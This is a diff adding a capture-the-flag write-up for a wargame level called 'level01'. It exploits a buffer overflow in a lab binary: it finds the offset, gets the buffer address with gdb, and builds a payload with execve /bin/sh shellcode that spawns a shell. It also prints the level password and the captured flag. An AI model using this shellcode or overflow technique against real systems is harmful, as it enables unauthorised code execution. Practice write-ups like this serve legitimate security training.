@@ -1,0 +1,28 @@
+level01 : uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
+process :
+    - We got a binaire that will take two input (username:password)
+    
+    - In the code source we find the username : dat_will (but dat_willtest/dat_will1234 work)
+        (We can write payload after our dat_will)
+    
+    - With some test we find our offset : ("dat_will" + "A" * 327 + "BBBB") eip = 0x42424242
+                                            (offset = dat_will + 331 (339))
+
+    - We need to find the adress where our payload will be stored :
+        the user input is write into the  fgets(&a_user_name,0x100,stdin)  
+
+        with gdb we break just after the first fgets and we print eax
+        - gdb level01
+        - b *main+93
+        - enter dat_will to continue the main
+        - x $eax = 0x804a040 <a_user_name>	0x5f746164
+        - get the adress = 0x804a040
+
+    - now we get our shellcode on shellstorm : https://shell-storm.org/shellcode/files/shellcode-575.html
+
+    - We can build our payload : 
+        python -c 'print("dat_will" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 306 + "\x48\xa0\x04\x08")' > /tmp/level01
+            ("dat_will" + "shellcode" + "offset(306)" + "adress + 8 bytes to pass dat_will")
+
+    - cat /tmp/level01 - | ./level01
+    - Get the flag : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
